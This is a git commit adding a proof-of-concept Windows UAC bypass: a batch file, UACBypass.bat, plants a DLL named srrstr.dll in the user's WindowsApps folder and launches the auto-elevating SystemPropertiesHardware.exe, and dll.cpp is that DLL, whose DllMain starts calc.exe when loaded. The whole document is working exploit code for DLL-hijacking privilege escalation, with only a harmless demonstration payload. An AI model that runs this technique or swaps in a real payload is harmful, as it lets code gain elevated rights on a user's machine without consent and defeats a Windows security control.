54bc1f7961b3508ab42c32abfb5af3f260e1c346
Se Yeong Lee <qerogram@naver.com>
2020-05-26 20:33:10 +0900

    Add files via upload

---
+++ UACBypass.bat
@@ -0,0 +1,3 @@
+@echo off
+copy srrstr.dll %userprofile%\Appdata\Local\Microsoft\WindowsApps\
+SystemPropertiesHardware.exe
---
+++ dll.cpp
@@ -0,0 +1,21 @@
+#include "pch.h"
+#include <windows.h>
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+        WinExec("calc.exe", SW_SHOW);
+        break;
+    case DLL_THREAD_ATTACH:
+        break;
+    case DLL_THREAD_DETACH:
+        break;
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
